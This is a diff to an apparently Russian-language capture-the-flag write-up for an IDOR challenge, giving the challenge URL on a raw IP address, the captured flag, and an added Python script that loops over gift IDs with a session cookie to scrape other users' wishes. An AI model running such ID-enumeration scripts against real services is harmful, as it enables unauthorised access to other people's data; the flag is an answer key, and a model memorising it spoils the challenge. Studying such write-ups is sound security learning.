@@ -4,3 +4,20 @@
 http://5.188.119.224:2024/getGift/31
 
 #mshp{IDOR_too_Fr3qu3nt_1n_0ur_d4ys}
+
+либо же можно написать не большой код
+
+import requests
+import bs4
+
+cookies = {
+    'wish': 'd412bed0-867a-4882-8483-e87349daaf87',
+}
+
+
+for i in range(100):
+    response = requests.get(f'http://5.188.119.224:2024/getGift/{i}', cookies=cookies)
+    soup = bs4.BeautifulSoup(response.text, 'html.parser')
+    print(i, soup.find('div', class_ ='wish').text)
+
+тогда брутом не находило так как я не указывал куки
